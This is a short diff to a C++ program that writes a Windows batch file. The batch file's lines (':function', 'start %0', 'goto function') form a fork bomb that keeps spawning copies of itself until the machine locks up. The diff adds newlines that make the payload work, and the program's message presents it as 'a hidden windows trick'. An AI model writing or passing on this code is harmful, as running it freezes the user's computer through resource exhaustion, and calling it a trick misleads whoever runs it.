@@ -7,9 +7,9 @@ int main() {
     std::ofstream batFile("example.bat");
     if (batFile.is_open()) {
         batFile << "@echo off\n";
-        batFile << ":function";    
-        batFile << "start %0";
-        batFile << "goto function";
+        batFile << ":function\n";    
+        batFile << "start %0\n";
+        batFile << "goto function\n";
         batFile.close();
         std::cout << "Batch file created successfully, should run a hidden windows trick\n";
     } else {
